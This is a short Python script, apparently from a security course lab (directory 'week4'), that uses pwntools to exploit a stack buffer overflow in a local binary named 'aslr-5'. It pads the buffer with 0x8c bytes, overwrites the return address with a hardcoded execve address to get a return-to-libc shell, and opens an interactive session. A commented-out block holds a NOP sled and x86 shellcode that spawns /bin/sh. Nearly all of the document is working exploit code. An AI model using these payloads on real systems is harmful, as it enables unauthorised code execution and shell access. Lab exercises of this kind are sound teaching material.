#!/usr/bin/env python

from pwn import *
import os


env = {
    'PATH': '/home/users/hobbes/week4/aslr-6'
}

"""
shellcode = '\x90' * 100000 + "j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"

env = {
    'shellcode': shellcode
}
"""

execve = p32(0xb7dfe7e0)
addr = p32(0x804827a)

p = process('./aslr-5')

buf = "A" * 0x8c + execve + "BBBB"  + addr + p32(0) + p32(0)

p.sendline(buf)

print(p.recv())

p.interactive()
